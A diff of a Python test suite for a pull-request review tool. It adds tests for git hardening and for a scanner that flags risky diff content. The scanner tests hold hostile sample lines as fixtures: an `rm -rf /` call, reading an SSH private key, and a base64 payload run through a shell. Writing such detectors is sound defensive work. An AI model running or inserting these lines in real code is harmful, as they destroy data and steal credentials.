@@ -10,6 +10,7 @@ from pathlib import Path
 from unittest.mock import patch
 
 from review_engine import (
+    _apply_hardened_git_env,
     annotate_stack_status,
     blind_stack_summary,
     build_arg_parser,
@@ -24,12 +25,13 @@ from review_engine import (
     prepare_workspace,
     resolve_pr_coordinates,
     resolve_pr_metadata,
+    run_command,
+    scan_diff_execution_risks,
     structural_stack,
 )
 
 
 class TestReviewEngine(unittest.TestCase):
-
     def test_parse_repo_from_url(self):
         self.assertEqual(
             parse_repo_from_url("https://github.com/octocat/hello-world/pull/42"),
@@ -39,34 +41,47 @@ class TestReviewEngine(unittest.TestCase):
 
     def test_arg_parser_accepts_reference_and_repo_dir(self):
         parser = build_arg_parser()
-        args_ref = parser.parse_args([
-            "--pr", "42",
-            "--prepare-workspace",
-            "--reference", "/tmp/local-repo",
-            "--output-coords", "pr_coords.json",
-            "--output-diff", "pr.diff",
-            "--output-workspace", "workspace_dir.txt",
-        ])
+        args_ref = parser.parse_args(
+            [
+                "--pr",
+                "42",
+                "--prepare-workspace",
+                "--reference",
+                "/tmp/local-repo",
+                "--output-coords",
+                "pr_coords.json",
+                "--output-diff",
+                "pr.diff",
+                "--output-workspace",
+                "workspace_dir.txt",
+            ]
+        )
         self.assertEqual(args_ref.repo_dir, "/tmp/local-repo")
 
-        args_dir = parser.parse_args([
-            "--pr", "42",
-            "--prepare-workspace",
-            "--repo-dir", "/tmp/other-repo",
-        ])
+        args_dir = parser.parse_args(
+            [
+                "--pr",
+                "42",
+                "--prepare-workspace",
+                "--repo-dir",
+                "/tmp/other-repo",
+            ]
+        )
         self.assertEqual(args_dir.repo_dir, "/tmp/other-repo")
 
     @patch("review_engine.run_command")
     def test_resolve_pr_coordinates_omits_narrative_fields(self, mock_run):
         mock_run.return_value = (
             0,
-            json.dumps({
-                "number": 42,
-                "baseRefName": "main",
-                "headRefOid": "abc1234",
-                "url": "https://github.com/octocat/hello-world/pull/42",
-                "state": "OPEN",
-            }),
+            json.dumps(
+                {
+                    "number": 42,
+                    "baseRefName": "main",
+                    "headRefOid": "abc1234",
+                    "url": "https://github.com/octocat/hello-world/pull/42",
+                    "state": "OPEN",
+                }
+            ),
             "",
         )
 
@@ -91,16 +106,18 @@ class TestReviewEngine(unittest.TestCase):
     def test_resolve_pr_metadata_backwards_compatible(self, mock_run):
         mock_run.return_value = (
             0,
-            json.dumps({
-                "number": 42,
-                "title": "feat: add widget",
-                "author": {"login": "octocat"},
-                "baseRefName": "main",
-                "headRefName": "feat/widget",
-                "headRefOid": "abc1234",
-                "url": "https://github.com/octocat/hello-world/pull/42",
-                "state": "OPEN",
-            }),
+            json.dumps(
+                {
+                    "number": 42,
+                    "title": "feat: add widget",
+                    "author": {"login": "octocat"},
+                    "baseRefName": "main",
+                    "headRefName": "feat/widget",
+                    "headRefOid": "abc1234",
+                    "url": "https://github.com/octocat/hello-world/pull/42",
+                    "state": "OPEN",
+                }
+            ),
             "",
         )
         meta = resolve_pr_metadata("42")
@@ -218,19 +235,21 @@ class TestReviewEngine(unittest.TestCase):
             (1, "", "GraphQL timeout"),
             (
                 0,
-                json.dumps({
-                    "number": 42,
-                    "title": "fallback title",
-                    "body": "fallback body",
-                    "author": {"login": "octocat"},
-                    "baseRefName": "main",
-                    "headRefName": "fix/fallback",
-                    "headRefOid": "cafebabe",
-                    "url": "https://github.com/octocat/hello-world/pull/42",
-                    "state": "OPEN",
-                    "comments": [{"author": {"login": "bob"}, "body": "Hi"}],
-                    "reviews": [],
-                }),
+                json.dumps(
+                    {
+                        "number": 42,
+                        "title": "fallback title",
+                        "body": "fallback body",
+                        "author": {"login": "octocat"},
+                        "baseRefName": "main",
+                        "headRefName": "fix/fallback",
+                        "headRefOid": "cafebabe",
+                        "url": "https://github.com/octocat/hello-world/pull/42",
+                        "state": "OPEN",
+                        "comments": [{"author": {"login": "bob"}, "body": "Hi"}],
+                        "reviews": [],
+                    }
+                ),
                 "",
             ),
         ]
@@ -307,21 +326,32 @@ class TestReviewEngine(unittest.TestCase):
             diff_file = tmp_path / "pr.diff"
             ws_file = tmp_path / "ws.txt"
 
-            rc = main([
-                "--pr", "42",
-                "--prepare-workspace",
-                "--reference", "/tmp/ref",
-                "--output-coords", str(coords_file),
-                "--output-diff", str(diff_file),
-                "--output-workspace", str(ws_file),
-            ])
+            rc = main(
+                [
+                    "--pr",
+                    "42",
+                    "--prepare-workspace",
+                    "--reference",
+                    "/tmp/ref",
+                    "--output-coords",
+                    str(coords_file),
+                    "--output-diff",
+                    str(diff_file),
+                    "--output-workspace",
+                    str(ws_file),
+                ]
+            )
             self.assertEqual(rc, 0)
             saved_coords = json.loads(coords_file.read_text(encoding="utf-8"))
             self.assertEqual(saved_coords["workspace_dir"], "/tmp/pr-review-abc123")
             self.assertEqual(saved_coords["head_sha"], "actual_checked_out_sha")
             self.assertNotIn("title", saved_coords)
-            self.assertEqual(diff_file.read_text(encoding="utf-8"), "diff --git a/a.py b/a.py\n")
-            self.assertEqual(ws_file.read_text(encoding="utf-8"), "/tmp/pr-review-abc123")
+            self.assertEqual(
+                diff_file.read_text(encoding="utf-8"), "diff --git a/a.py b/a.py\n"
+            )
+            self.assertEqual(
+                ws_file.read_text(encoding="utf-8"), "/tmp/pr-review-abc123"
+            )
 
     @patch("review_engine.cleanup_workspace")
     @patch("review_engine.run_command")
@@ -350,17 +380,39 @@ class TestReviewEngine(unittest.TestCase):
 
     @patch("review_engine.fetch_pr_stack", return_value=None)
     @patch("review_engine.fetch_pr_context")
-    def test_main_fetch_context_enforces_blind_description_and_pins_sha(self, mock_fetch, _mock_stack):
+    def test_main_fetch_context_enforces_blind_description_and_pins_sha(
+        self, mock_fetch, _mock_stack
+    ):
         mock_fetch.return_value = (
-            {"owner": "o", "repo": "r", "pull_number": 1, "title": "T", "head_sha": "new_sha_222"},
-            {"title": "T", "body": "B", "comments": [], "reviews": [], "threads": [], "threads_complete": True},
+            {
+                "owner": "o",
+                "repo": "r",
+                "pull_number": 1,
+                "title": "T",
+                "head_sha": "new_sha_222",
+            },
+            {
+                "title": "T",
+                "body": "B",
+                "comments": [],
+                "reviews": [],
+                "threads": [],
+                "threads_complete": True,
+            },
         )
 
         with tempfile.TemporaryDirectory() as tmp:
             tmp_path = Path(tmp)
             coords_file = tmp_path / "pr_coords.json"
             coords_file.write_text(
-                json.dumps({"owner": "o", "repo": "r", "pull_number": 1, "head_sha": "stage1_sha_111"}),
+                json.dumps(
+                    {
+                        "owner": "o",
+                        "repo": "r",
+                        "pull_number": 1,
+                        "head_sha": "stage1_sha_111",
+                    }
+                ),
                 encoding="utf-8",
             )
             blind_file = tmp_path / "blind_description.md"
@@ -368,46 +420,68 @@ class TestReviewEngine(unittest.TestCase):
             ctx_file = tmp_path / "pr_context.json"
 
             # Fails when --require-blind-description is omitted altogether (M6)
-            rc_no_flag = main([
-                "--fetch-context",
-                "--input-coords", str(coords_file),
-                "--output-meta", str(meta_file),
-            ])
+            rc_no_flag = main(
+                [
+                    "--fetch-context",
+                    "--input-coords",
+                    str(coords_file),
+                    "--output-meta",
+                    str(meta_file),
+                ]
+            )
             self.assertEqual(rc_no_flag, 1)
             mock_fetch.assert_not_called()
 
             # Fails when blind_description.md does not exist
-            rc_missing = main([
-                "--fetch-context",
-                "--input-coords", str(coords_file),
-                "--require-blind-description", str(blind_file),
-                "--output-meta", str(meta_file),
-                "--output-context", str(ctx_file),
-            ])
+            rc_missing = main(
+                [
+                    "--fetch-context",
+                    "--input-coords",
+                    str(coords_file),
+                    "--require-blind-description",
+                    str(blind_file),
+                    "--output-meta",
+                    str(meta_file),
+                    "--output-context",
+                    str(ctx_file),
+                ]
+            )
             self.assertEqual(rc_missing, 1)
             mock_fetch.assert_not_called()
 
             # Fails when blind_description.md is empty whitespace
             blind_file.write_text("   \n", encoding="utf-8")
-            rc_empty = main([
-                "--fetch-context",
-                "--input-coords", str(coords_file),
-                "--require-blind-description", str(blind_file),
-                "--output-meta", str(meta_file),
-                "--output-context", str(ctx_file),
-            ])
+            rc_empty = main(
+                [
+                    "--fetch-context",
+                    "--input-coords",
+                    str(coords_file),
+                    "--require-blind-description",
+                    str(blind_file),
+                    "--output-meta",
+                    str(meta_file),
+                    "--output-context",
+                    str(ctx_file),
+                ]
+            )
             self.assertEqual(rc_empty, 1)
             mock_fetch.assert_not_called()
 
             # Succeeds once blind_description.md has content, and pins Stage 1 SHA (H2)
             blind_file.write_text("## Summary\nUpdates parser.", encoding="utf-8")
-            rc_ok = main([
-                "--fetch-context",
-                "--input-coords", str(coords_file),
-                "--require-blind-description", str(blind_file),
-                "--output-meta", str(meta_file),
-                "--output-context", str(ctx_file),
-            ])
+            rc_ok = main(
+                [
+                    "--fetch-context",
+                    "--input-coords",
+                    str(coords_file),
+                    "--require-blind-description",
+                    str(blind_file),
+                    "--output-meta",
+                    str(meta_file),
+                    "--output-context",
+                    str(ctx_file),
+                ]
+            )
             self.assertEqual(rc_ok, 0)
             mock_fetch.assert_called_once_with("o", "r", 1)
             saved_meta = json.loads(meta_file.read_text(encoding="utf-8"))
@@ -423,11 +497,15 @@ class TestReviewEngine(unittest.TestCase):
             blind_file = tmp_path / "blind.md"
             blind_file.write_text("## Summary\nOk.", encoding="utf-8")
 
-            rc = main([
-                "--fetch-context",
-                "--input-coords", str(coords_file),
-                "--require-blind-description", str(blind_file),
-            ])
+            rc = main(
+                [
+                    "--fetch-context",
+                    "--input-coords",
+                    str(coords_file),
+                    "--require-blind-description",
+                    str(blind_file),
+                ]
+            )
             self.assertEqual(rc, 1)
 
     def test_cleanup_workspace_safety(self):
@@ -460,7 +538,14 @@ class TestReviewEngine(unittest.TestCase):
             safe_dir_json = tempfile.mkdtemp(prefix="pr-review-")
             coords_file = scratch_path / "pr_coords.json"
             coords_file.write_text(
-                json.dumps({"owner": "o", "repo": "r", "pull_number": 1, "workspace_dir": safe_dir_json}),
+                json.dumps(
+                    {
+                        "owner": "o",
+                        "repo": "r",
+                        "pull_number": 1,
+                        "workspace_dir": safe_dir_json,
+                    }
+                ),
                 encoding="utf-8",
             )
             self.assertTrue(cleanup_workspace(str(coords_file)))
@@ -469,46 +554,99 @@ class TestReviewEngine(unittest.TestCase):
 
 def _stack_graphql_payload(target: int = 3045) -> str:
     """A GraphQL `pullRequest.stack` response for a three-PR stack, bottom first."""
-    return json.dumps({
-        "data": {"repository": {"pullRequest": {"stack": {
-            "number": 3046,
-            "size": 3,
-            "baseRefName": "main",
-            "entries": {"totalCount": 3, "nodes": [
-                {"pullRequest": {"number": 3027, "title": "fix(python): resolve", "state": "OPEN",
-                                 "isDraft": False, "headRefName": "fix/py", "baseRefName": "main",
-                                 "url": "https://github.com/o/r/pull/3027"}},
-                {"pullRequest": {"number": 3044, "title": "fix(ts): resolve", "state": "OPEN",
-                                 "isDraft": True, "headRefName": "fix/ts", "baseRefName": "fix/py",
-                                 "url": "https://github.com/o/r/pull/3044"}},
-                {"pullRequest": {"number": target, "title": "fix(dart): resolve", "state": "OPEN",
-                                 "isDraft": False, "headRefName": "fix/dart", "baseRefName": "fix/ts",
-                                 "url": f"https://github.com/o/r/pull/{target}"}},
-            ]},
-        }}}}
-    })
+    return json.dumps(
+        {
+            "data": {
+                "repository": {
+                    "pullRequest": {
+                        "stack": {
+                            "number": 3046,
+                            "size": 3,
+                            "baseRefName": "main",
+                            "entries": {
+                                "totalCount": 3,
+                                "nodes": [
+                                    {
+                                        "pullRequest": {
+                                            "number": 3027,
+                                            "title": "fix(python): resolve",
+                                            "state": "OPEN",
+                                            "isDraft": False,
+                                            "headRefName": "fix/py",
+                                            "baseRefName": "main",
+                                            "url": "https://github.com/o/r/pull/3027",
+                                        }
+                                    },
+                                    {
+                                        "pullRequest": {
+                                            "number": 3044,
+                                            "title": "fix(ts): resolve",
+                                            "state": "OPEN",
+                                            "isDraft": True,
+                                            "headRefName": "fix/ts",
+                                            "baseRefName": "fix/py",
+                                            "url": "https://github.com/o/r/pull/3044",
+                                        }
+                                    },
+                                    {
+                                        "pullRequest": {
+                                            "number": target,
+                                            "title": "fix(dart): resolve",
+                                            "state": "OPEN",
+                                            "isDraft": False,
+                                            "headRefName": "fix/dart",
+                                            "baseRefName": "fix/ts",
+                                            "url": f"https://github.com/o/r/pull/{target}",
+                                        }
+                                    },
+                                ],
+                            },
+                        }
+                    }
+                }
+            }
+        }
+    )
 
 
 def _stack_view_json() -> str:
     """`gh stack view --json` output matching `_stack_graphql_payload`, with the bottom PR stale."""
-    return json.dumps({
-        "trunk": "main",
-        "currentBranch": "fix/dart",
-        "branches": [
-            {"name": "fix/py", "needsRebase": True, "isMerged": False, "isQueued": False,
-             "pr": {"number": 3027, "state": "OPEN"}},
-            {"name": "fix/ts", "needsRebase": False, "isMerged": False, "isQueued": False,
-             "pr": {"number": 3044, "state": "OPEN"}},
-            {"name": "fix/dart", "needsRebase": False, "isMerged": False, "isQueued": False,
-             "pr": {"number": 3045, "state": "OPEN"}},
-        ],
-    })
+    return json.dumps(
+        {
+            "trunk": "main",
+            "currentBranch": "fix/dart",
+            "branches": [
+                {
+                    "name": "fix/py",
+                    "needsRebase": True,
+                    "isMerged": False,
+                    "isQueued": False,
+                    "pr": {"number": 3027, "state": "OPEN"},
+                },
+                {
+                    "name": "fix/ts",
+                    "needsRebase": False,
+                    "isMerged": False,
+                    "isQueued": False,
+                    "pr": {"number": 3044, "state": "OPEN"},
+                },
+                {
+                    "name": "fix/dart",
+                    "needsRebase": False,
+                    "isMerged": False,
+                    "isQueued": False,
+                    "pr": {"number": 3045, "state": "OPEN"},
+                },
+            ],
+        }
+    )
 
 
 class TestStackDetection(unittest.TestCase):
-
     @patch("review_engine.run_command")
-    def test_fetch_pr_stack_orders_entries_bottom_first_and_marks_target(self, mock_run):
+    def test_fetch_pr_stack_orders_entries_bottom_first_and_marks_target(
+        self, mock_run
+    ):
         mock_run.return_value = (0, _stack_graphql_payload(), "")
         stack = fetch_pr_stack("o", "r", 3045)
         self.assertEqual(stack["number"], 3046)
@@ -517,14 +655,20 @@ class TestStackDetection(unittest.TestCase):
         self.assertEqual(stack["position"], 3)
         self.assertTrue(stack["entries_complete"])
         self.assertEqual([e["number"] for e in stack["entries"]], [3027, 3044, 3045])
-        self.assertEqual([e["is_target"] for e in stack["entries"]], [False, False, True])
+        self.assertEqual(
+            [e["is_target"] for e in stack["entries"]], [False, False, True]
+        )
         self.assertEqual(stack["entries"][1]["base_ref"], "fix/py")
         self.assertTrue(stack["entries"][1]["is_draft"])
         self.assertEqual(mock_run.call_args[0][0][:3], ["gh", "api", "graphql"])
 
     @patch("review_engine.run_command")
     def test_fetch_pr_stack_returns_none_when_not_stacked_or_on_failure(self, mock_run):
-        mock_run.return_value = (0, json.dumps({"data": {"repository": {"pullRequest": {"stack": None}}}}), "")
+        mock_run.return_value = (
+            0,
+            json.dumps({"data": {"repository": {"pullRequest": {"stack": None}}}}),
+            "",
+        )
         self.assertIsNone(fetch_pr_stack("o", "r", 2994))
         mock_run.return_value = (1, "", "GraphQL: Could not resolve to a PullRequest")
         self.assertIsNone(fetch_pr_stack("o", "r", 2994))
@@ -546,10 +690,18 @@ class TestStackDetection(unittest.TestCase):
         serialized = json.dumps(blind)
         for forbidden in ("fix/py", "fix/ts", "fix/dart", "resolve", "github.com"):
             self.assertNotIn(forbidden, serialized)
-        self.assertEqual(blind["entries"][0], {
-            "number": 3027, "state": "OPEN", "is_draft": False, "is_target": False,
-            "needs_rebase": True, "is_merged": False, "is_queued": False,
-        })
+        self.assertEqual(
+            blind["entries"][0],
+            {
+                "number": 3027,
+                "state": "OPEN",
+                "is_draft": False,
+                "is_target": False,
+                "needs_rebase": True,
+                "is_merged": False,
+                "is_queued": False,
+            },
+        )
 
         structural = structural_stack(stack)
         self.assertEqual(structural["entries"][0]["head_ref"], "fix/py")
@@ -561,16 +713,20 @@ class TestStackDetection(unittest.TestCase):
     @patch("review_engine.run_command")
     def test_capture_stack_view_restores_detached_head(self, mock_run):
         mock_run.side_effect = [
-            (0, "start_sha", ""),                      # git rev-parse HEAD
-            (0, "✓ Imported stack", ""),               # gh stack checkout 3045
-            (0, _stack_view_json(), ""),               # gh stack view --json
-            (0, "", ""),                               # git checkout --detach start_sha
+            (0, "start_sha", ""),  # git rev-parse HEAD
+            (0, "✓ Imported stack", ""),  # gh stack checkout 3045
+            (0, _stack_view_json(), ""),  # gh stack view --json
+            (0, "", ""),  # git checkout --detach start_sha
         ]
         view = capture_stack_view("/tmp/ws", 3045)
         self.assertEqual(view["trunk"], "main")
         self.assertEqual(len(view["branches"]), 3)
-        self.assertEqual(mock_run.call_args_list[1][0][0], ["gh", "stack", "checkout", "3045"])
-        self.assertEqual(mock_run.call_args_list[2][0][0], ["gh", "stack", "view", "--json"])
+        self.assertEqual(
+            mock_run.call_args_list[1][0][0], ["gh", "stack", "checkout", "3045"]
+        )
+        self.assertEqual(
+            mock_run.call_args_list[2][0][0], ["gh", "stack", "view", "--json"]
+        )
         self.assertEqual(
             mock_run.call_args_list[3][0][0],
             ["git", "checkout", "--quiet", "--detach", "start_sha"],
@@ -580,39 +736,51 @@ class TestStackDetection(unittest.TestCase):
     def test_capture_stack_view_returns_none_without_extension(self, mock_run):
         mock_run.side_effect = [
             (0, "start_sha", ""),
-            (1, "", "unknown command \"stack\" for \"gh\""),
+            (1, "", 'unknown command "stack" for "gh"'),
             (0, "", ""),
         ]
         self.assertIsNone(capture_stack_view("/tmp/ws", 3045))
-        self.assertEqual(mock_run.call_args_list[-1][0][0][:3], ["git", "checkout", "--quiet"])
+        self.assertEqual(
+            mock_run.call_args_list[-1][0][0][:3], ["git", "checkout", "--quiet"]
+        )
 
     @patch("review_engine.run_command")
     def test_annotate_stack_status_falls_back_to_git_ancestry(self, mock_run):
         mock_run.side_effect = [
             (0, _stack_graphql_payload(), ""),
-            (1, "", ""),   # origin/main not in origin/fix/py -> needs rebase
-            (0, "", ""),   # origin/fix/py in origin/fix/ts
+            (1, "", ""),  # origin/main not in origin/fix/py -> needs rebase
+            (0, "", ""),  # origin/fix/py in origin/fix/ts
             (128, "", "fatal: Not a valid object name"),  # unknown
         ]
         stack = fetch_pr_stack("o", "r", 3045)
         annotate_stack_status(stack, None, workspace_dir="/tmp/ws")
         self.assertEqual(stack["source"], "git ancestry")
-        self.assertEqual([e["needs_rebase"] for e in stack["entries"]], [True, False, None])
+        self.assertEqual(
+            [e["needs_rebase"] for e in stack["entries"]], [True, False, None]
+        )
         self.assertEqual(
             mock_run.call_args_list[1][0][0],
             ["git", "merge-base", "--is-ancestor", "origin/main", "origin/fix/py"],
         )
 
     def test_merge_stack_status_copies_recorded_flags_by_pr_number(self):
-        fresh = {"number": 3046, "size": 3, "position": 3, "entries": [
-            {"number": 3027, "title": "a", "needs_rebase": None},
-            {"number": 3044, "title": "b", "needs_rebase": None},
-            {"number": 3099, "title": "new", "needs_rebase": None},
-        ]}
-        recorded = {"source": "gh stack view", "entries": [
-            {"number": 3027, "needs_rebase": True, "is_merged": False},
-            {"number": 3044, "needs_rebase": False},
-        ]}
+        fresh = {
+            "number": 3046,
+            "size": 3,
+            "position": 3,
+            "entries": [
+                {"number": 3027, "title": "a", "needs_rebase": None},
+                {"number": 3044, "title": "b", "needs_rebase": None},
+                {"number": 3099, "title": "new", "needs_rebase": None},
+            ],
+        }
+        recorded = {
+            "source": "gh stack view",
+            "entries": [
+                {"number": 3027, "needs_rebase": True, "is_merged": False},
+                {"number": 3044, "needs_rebase": False},
+            ],
+        }
         merged = merge_stack_status(fresh, recorded)
         self.assertEqual(merged["source"], "gh stack view")
         self.assertTrue(merged["entries"][0]["needs_rebase"])
@@ -633,11 +801,18 @@ class TestStackDetection(unittest.TestCase):
         self, mock_coords, mock_prep, mock_diff, mock_run, mock_stack, mock_view
     ):
         mock_coords.return_value = {
-            "owner": "o", "repo": "r", "pull_number": 3045, "base_ref": "fix/ts",
-            "head_sha": "1111111", "pr_url": "https://github.com/o/r/pull/3045", "state": "OPEN",
+            "owner": "o",
+            "repo": "r",
+            "pull_number": 3045,
+            "base_ref": "fix/ts",
+            "head_sha": "1111111",
+            "pr_url": "https://github.com/o/r/pull/3045",
+            "state": "OPEN",
         }
         mock_prep.return_value = ("/tmp/pr-review-stack", True)
-        with patch("review_engine.run_command", return_value=(0, _stack_graphql_payload(), "")):
+        with patch(
+            "review_engine.run_command", return_value=(0, _stack_graphql_payload(), "")
+        ):
             mock_stack.return_value = fetch_pr_stack("o", "r", 3045)
         mock_view.return_value = json.loads(_stack_view_json())
         mock_run.return_value = (0, "checked_out_sha", "")
@@ -646,11 +821,17 @@ class TestStackDetection(unittest.TestCase):
         with tempfile.TemporaryDirectory() as tmp:
             coords_file = Path(tmp) / "pr_coords.json"
             stack_file = Path(tmp) / "pr_stack.json"
-            rc = main([
-                "--pr", "3045", "--prepare-workspace",
-                "--output-coords", str(coords_file),
-                "--output-stack", str(stack_file),
-            ])
+            rc = main(
+                [
+                    "--pr",
+                    "3045",
+                    "--prepare-workspace",
+                    "--output-coords",
+                    str(coords_file),
+                    "--output-stack",
+                    str(stack_file),
+                ]
+            )
             self.assertEqual(rc, 0)
             mock_view.assert_called_once_with("/tmp/pr-review-stack", 3045)
             coords = json.loads(coords_file.read_text(encoding="utf-8"))
@@ -666,72 +847,244 @@ class TestStackDetection(unittest.TestCase):
     @patch("review_engine.fetch_pr_stack", return_value=None)
     @patch("review_engine.run_command", return_value=(0, "sha", ""))
     @patch("review_engine.get_pr_diff", return_value="diff --git a/a.py b/a.py\n")
-    @patch("review_engine.prepare_workspace", return_value=("/tmp/pr-review-flat", True))
+    @patch(
+        "review_engine.prepare_workspace", return_value=("/tmp/pr-review-flat", True)
+    )
     @patch("review_engine.resolve_pr_coordinates")
     def test_main_prepare_workspace_records_null_stack_for_unstacked_pr(
         self, mock_coords, _prep, _diff, _run, _stack, mock_view
     ):
         mock_coords.return_value = {
-            "owner": "o", "repo": "r", "pull_number": 7, "base_ref": "main",
-            "head_sha": "1", "pr_url": "https://github.com/o/r/pull/7", "state": "OPEN",
+            "owner": "o",
+            "repo": "r",
+            "pull_number": 7,
+            "base_ref": "main",
+            "head_sha": "1",
+            "pr_url": "https://github.com/o/r/pull/7",
+            "state": "OPEN",
         }
         with tempfile.TemporaryDirectory() as tmp:
             coords_file = Path(tmp) / "pr_coords.json"
             stack_file = Path(tmp) / "pr_stack.json"
-            rc = main([
-                "--pr", "7", "--prepare-workspace",
-                "--output-coords", str(coords_file),
-                "--output-stack", str(stack_file),
-            ])
+            rc = main(
+                [
+                    "--pr",
+                    "7",
+                    "--prepare-workspace",
+                    "--output-coords",
+                    str(coords_file),
+                    "--output-stack",
+                    str(stack_file),
+                ]
+            )
             self.assertEqual(rc, 0)
             mock_view.assert_not_called()
-            self.assertIsNone(json.loads(coords_file.read_text(encoding="utf-8"))["stack"])
+            self.assertIsNone(
+                json.loads(coords_file.read_text(encoding="utf-8"))["stack"]
+            )
             self.assertFalse(stack_file.exists())
 
     @patch("review_engine.fetch_pr_stack")
     @patch("review_engine.fetch_pr_context")
-    def test_main_fetch_context_merges_recorded_stack_status(self, mock_fetch, mock_stack):
+    def test_main_fetch_context_merges_recorded_stack_status(
+        self, mock_fetch, mock_stack
+    ):
         mock_fetch.return_value = (
-            {"owner": "o", "repo": "r", "pull_number": 3045, "title": "T", "head_sha": "s"},
-            {"title": "T", "body": "B", "comments": [], "reviews": [], "threads": [], "threads_complete": True},
+            {
+                "owner": "o",
+                "repo": "r",
+                "pull_number": 3045,
+                "title": "T",
+                "head_sha": "s",
+            },
+            {
+                "title": "T",
+                "body": "B",
+                "comments": [],
+                "reviews": [],
+                "threads": [],
+                "threads_complete": True,
+            },
         )
-        with patch("review_engine.run_command", return_value=(0, _stack_graphql_payload(), "")):
+        with patch(
+            "review_engine.run_command", return_value=(0, _stack_graphql_payload(), "")
+        ):
             mock_stack.return_value = fetch_pr_stack("o", "r", 3045)
 
         with tempfile.TemporaryDirectory() as tmp:
             tmp_path = Path(tmp)
             coords_file = tmp_path / "pr_coords.json"
             coords_file.write_text(
-                json.dumps({"owner": "o", "repo": "r", "pull_number": 3045, "head_sha": "s"}),
+                json.dumps(
+                    {"owner": "o", "repo": "r", "pull_number": 3045, "head_sha": "s"}
+                ),
                 encoding="utf-8",
             )
             blind_file = tmp_path / "blind_description.md"
             blind_file.write_text("## Summary\nOk.", encoding="utf-8")
             stack_file = tmp_path / "pr_stack.json"
-            stack_file.write_text(json.dumps({"source": "gh stack view", "entries": [
-                {"number": 3027, "needs_rebase": True},
-            ]}), encoding="utf-8")
+            stack_file.write_text(
+                json.dumps(
+                    {
+                        "source": "gh stack view",
+                        "entries": [
+                            {"number": 3027, "needs_rebase": True},
+                        ],
+                    }
+                ),
+                encoding="utf-8",
+            )
             meta_file = tmp_path / "pr_meta.json"
             ctx_file = tmp_path / "pr_context.json"
 
-            rc = main([
-                "--fetch-context",
-                "--input-coords", str(coords_file),
-                "--input-stack", str(stack_file),
-                "--require-blind-description", str(blind_file),
-                "--output-meta", str(meta_file),
-                "--output-context", str(ctx_file),
-            ])
+            rc = main(
+                [
+                    "--fetch-context",
+                    "--input-coords",
+                    str(coords_file),
+                    "--input-stack",
+                    str(stack_file),
+                    "--require-blind-description",
+                    str(blind_file),
+                    "--output-meta",
+                    str(meta_file),
+                    "--output-context",
+                    str(ctx_file),
+                ]
+            )
             self.assertEqual(rc, 0)
             context = json.loads(ctx_file.read_text(encoding="utf-8"))
             self.assertEqual(context["stack"]["number"], 3046)
             self.assertEqual(context["stack"]["source"], "gh stack view")
             self.assertTrue(context["stack"]["entries"][0]["needs_rebase"])
-            self.assertEqual(context["stack"]["entries"][0]["title"], "fix(python): resolve")
+            self.assertEqual(
+                context["stack"]["entries"][0]["title"], "fix(python): resolve"
+            )
             meta = json.loads(meta_file.read_text(encoding="utf-8"))
             self.assertEqual(meta["stack"], {"number": 3046, "size": 3, "position": 3})
+
+    def test_apply_hardened_git_env_appends_to_existing_count(self):
+        env = {
+            "GIT_CONFIG_COUNT": "1",
+            "GIT_CONFIG_KEY_0": "user.name",
+            "GIT_CONFIG_VALUE_0": "alice",
+        }
+        _apply_hardened_git_env(env)
+        self.assertEqual(env["GIT_CONFIG_COUNT"], "4")
+        self.assertEqual(env["GIT_CONFIG_KEY_0"], "user.name")
+        self.assertEqual(env["GIT_CONFIG_KEY_1"], "core.hooksPath")
+        self.assertEqual(env["GIT_CONFIG_VALUE_1"], "/dev/null")
+        self.assertEqual(env["GIT_CONFIG_KEY_2"], "core.fsmonitor")
+        self.assertEqual(env["GIT_CONFIG_VALUE_2"], "false")
+        self.assertEqual(env["GIT_CONFIG_KEY_3"], "diff.external")
+        self.assertEqual(env["GIT_CONFIG_VALUE_3"], "")
+
+    @patch("review_engine.subprocess.run")
+    def test_run_command_injects_hardened_git_env(self, mock_subproc):
+        mock_subproc.return_value.returncode = 0
+        mock_subproc.return_value.stdout = "ok"
+        mock_subproc.return_value.stderr = ""
+        code, out, _ = run_command(["git", "status"])
+        self.assertEqual(code, 0)
+        self.assertEqual(out, "ok")
+        passed_env = mock_subproc.call_args.kwargs["env"]
+        count = int(passed_env["GIT_CONFIG_COUNT"])
+        pairs = {
+            passed_env[f"GIT_CONFIG_KEY_{i}"]: passed_env[f"GIT_CONFIG_VALUE_{i}"]
+            for i in range(count)
+        }
+        self.assertEqual(pairs["core.hooksPath"], "/dev/null")
+        self.assertEqual(pairs["core.fsmonitor"], "false")
+        self.assertEqual(pairs["diff.external"], "")
+
+    @patch("review_engine.run_command")
+    def test_get_pr_diff_passes_no_ext_diff_and_no_textconv(self, mock_run):
+        mock_run.return_value = (0, "diff --git a/x b/x\n", "")
+        out = get_pr_diff("/tmp/ws", base_ref="main", pull_number=10)
+        self.assertEqual(out, "diff --git a/x b/x\n")
+        cmd = mock_run.call_args[0][0]
+        self.assertIn("--no-ext-diff", cmd)
+        self.assertIn("--no-textconv", cmd)
+
+    def test_scan_diff_execution_risks_clean_and_deleted_lines(self):
+        diff = (
+            "diff --git a/src/math.py b/src/math.py\n"
+            "--- a/src/math.py\n"
+            "+++ b/src/math.py\n"
+            "@@ -10,3 +10,3 @@\n"
+            "-    subprocess.run(['rm', '-rf', '/'])\n"
+            "-    eval(user_input)\n"
+            "+    return x + y\n"
+        )
+        res = scan_diff_execution_risks(diff)
+        self.assertEqual(res["status"], "clean")
+        self.assertEqual(res["risk_count"], 0)
+        self.assertEqual(res["flagged_files"], [])
+        self.assertEqual(res["signals"], [])
+
+    def test_scan_diff_execution_risks_flags_configs_renames_and_code_hazards(self):
+        diff = (
+            "diff --git a/scripts/ innocent.sh b/.husky/pre-commit\n"
+            "similarity index 100%\n"
+            "rename from scripts/innocent.sh\n"
+            "rename to .husky/pre-commit\n"
+            "diff --git a/eslint.config.js b/eslint.config.js\n"
+            "--- a/eslint.config.js\n"
+            "+++ b/eslint.config.js\n"
+            "@@ -1,1 +1,2 @@\n"
+            " export default [];\n"
+            "+const cp = require('child_process');\n"
+            "diff --git a/tests/test_app.py b/tests/test_app.py\n"
+            "--- a/tests/test_app.py\n"
+            "+++ b/tests/test_app.py\n"
+            "@@ -20,1 +20,3 @@\n"
+            "+    key = open('~/.ssh/id_rsa').read()\n"
+            "+    payload = base64.b64decode('c2g=')\n"
+            "+    subprocess.Popen(['sh', '-c', payload])\n"
+        )
+        res = scan_diff_execution_risks(diff)
+        self.assertEqual(res["status"], "flagged")
+        self.assertIn(".husky/pre-commit", res["flagged_files"])
+        self.assertIn("eslint.config.js", res["flagged_files"])
+        self.assertIn("tests/test_app.py", res["flagged_files"])
+        self.assertEqual(res["categories"]["build_and_hook_configs"], 2)
